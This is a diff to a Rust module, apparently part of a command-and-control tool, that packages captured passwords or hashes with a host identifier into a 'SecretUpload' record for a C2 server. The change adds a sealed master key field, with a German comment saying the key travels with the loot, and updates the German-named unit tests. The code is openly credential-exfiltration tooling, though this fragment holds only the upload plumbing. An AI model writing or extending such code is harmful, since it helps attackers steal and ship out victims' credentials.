@@ -38,6 +38,7 @@ const MASTER_KEY_LEN: usize = 32;
 pub fn upload(
     secret: &Secret,
     master_key: Option<&[u8]>,
+    sealed_master: Option<&str>,
     host_id: &str,
 ) -> Result<c2::SecretUpload, String> {
     let upload = c2::SecretUpload {
@@ -48,6 +49,8 @@ pub fn upload(
         source: Some(secret.source.clone()),
         master_key: None,
         sealed_password: None,
+        // Der Schluessel reist mit der Beute — siehe das Feld in `c2.rs`.
+        sealed_master: sealed_master.map(|s| s.to_string()),
     };
     match master_key {
         Some(key) => {
@@ -80,8 +83,8 @@ mod tests {
     #[test]
     fn mit_master_key_ist_das_passwort_versiegelt_und_der_klartext_leer() {
         let key = [7u8; 32];
-        let upload =
-            upload(&secret(), Some(&key), "host-1").expect("die Versiegelung darf nicht scheitern");
+        let upload = upload(&secret(), Some(&key), None, "host-1")
+            .expect("die Versiegelung darf nicht scheitern");
 
         assert!(upload.password.is_empty(), "der Klartext steht im Upload");
         assert!(upload.sealed_password.is_some(), "das Feld ist leer");
@@ -92,7 +95,7 @@ mod tests {
 
     #[test]
     fn ohne_master_key_bleibt_der_klartext_und_ist_nicht_versiegelt() {
-        let upload = upload(&secret(), None, "host-1")
+        let upload = upload(&secret(), None, None, "host-1")
             .expect("ohne Schluessel gibt es nichts zu versiegeln");
 
         assert_eq!(upload.password, "hash-wert");
@@ -103,8 +106,8 @@ mod tests {
     fn beide_felder_koennen_nicht_gleichzeitig_gefuellt_sein() {
         let key = [7u8; 32];
         for upload in [
-            upload(&secret(), Some(&key), "host-1").expect("Versiegelung"),
-            upload(&secret(), None, "host-1").expect("Klartext"),
+            upload(&secret(), Some(&key), None, "host-1").expect("Versiegelung"),
+            upload(&secret(), None, None, "host-1").expect("Klartext"),
         ] {
             assert!(
                 upload.password.is_empty() || upload.sealed_password.is_none(),
@@ -116,8 +119,8 @@ mod tests {
     #[test]
     fn der_versiegelte_wert_laesst_sich_mit_demselben_schluessel_oeffnen() {
         let key = [7u8; 32];
-        let upload =
-            upload(&secret(), Some(&key), "host-1").expect("die Versiegelung darf nicht scheitern");
+        let upload = upload(&secret(), Some(&key), None, "host-1")
+            .expect("die Versiegelung darf nicht scheitern");
 
         let versiegelt = upload
             .sealed_password
@@ -129,7 +132,7 @@ mod tests {
 
     #[test]
     fn eine_falsche_schluessellaenge_ist_ein_fehler_und_kein_klartext() {
-        let upload = upload(&secret(), Some(&[1u8; 4]), "host-1");
+        let upload = upload(&secret(), Some(&[1u8; 4]), None, "host-1");
         assert!(upload.is_err(), "ein zu kurzer Schluessel muss scheitern");
     }
 
@@ -137,7 +140,7 @@ mod tests {
     /// wurde. Sie wird nicht aus der IP abgeleitet — sie kommt hier herein.
     #[test]
     fn der_upload_traegt_die_host_kennung() {
-        let upload = upload(&secret(), None, "192.168.1.5").expect("Upload");
+        let upload = upload(&secret(), None, None, "192.168.1.5").expect("Upload");
         assert_eq!(upload.host_id, "192.168.1.5");
     }
 }
